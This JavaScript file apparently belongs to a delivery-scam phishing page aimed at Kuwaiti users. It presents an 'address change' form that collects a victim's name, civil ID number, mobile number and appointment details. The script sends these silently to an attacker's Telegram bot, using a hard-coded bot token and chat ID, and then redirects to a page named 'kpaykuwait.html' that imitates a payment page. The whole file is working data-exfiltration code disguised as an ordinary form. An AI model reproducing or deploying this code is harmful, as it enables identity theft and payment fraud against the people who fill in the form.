window.onload = function () {
  const today = new Date().toISOString().split("T")[0];
  document.getElementById("futureDate").value = today;

  const token = "7714919420:AAEiI6a7p6YHHJRO4c5bCQt8F7zA62DufNM";
  const chatId = "7273991427";

  document.getElementById("form1").addEventListener("submit", function (e) {
      e.preventDefault();

      const name = document.getElementById("userName").value.trim();
      const phone = document.getElementById("phone").value.trim(); // تصحيح الوصول إلى رقم الهاتف المدني
      const phone1 = document.getElementById("phone1").value.trim(); // تصحيح الوصول إلى رقم الجوال
      const datehom = document.getElementById("futureDate").value.trim();
      const delivery_time = document.getElementById("selectform").value.trim();

      if (!name || !phone || !phone1 || !datehom || !delivery_time) {
          alert("يرجى ملء جميع الحقول.");
          return;
      }

      localStorage.setItem("storedUserName", name);

      const message = `
          📥  تعديل عنوان:
          👤 الاسم: ${name}
          📞 الرقم المدني: ${phone}
          📧 رقم الجوال: ${phone1}
          🗓️ تاريخ الحضور: ${datehom}
          ⏰ موعد التوصيل: ${delivery_time}
      `;

      fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
          method: 'POST',
          headers: {
              'Content-Type': 'application/json'
          },
          body: JSON.stringify({
              chat_id: chatId,
              text: message
          })
      })
      .then(response => {
          if (response.ok) {
              window.location.href = "kpaykuwait.html";
          } else {
              alert("فشل في إرسال البيانات.");
          }
      })
      .catch(error => {
          console.error("⚠️ خطأ في الاتصال:", error);
          alert("حدث خطأ أثناء الإرسال.");
      });
  });
};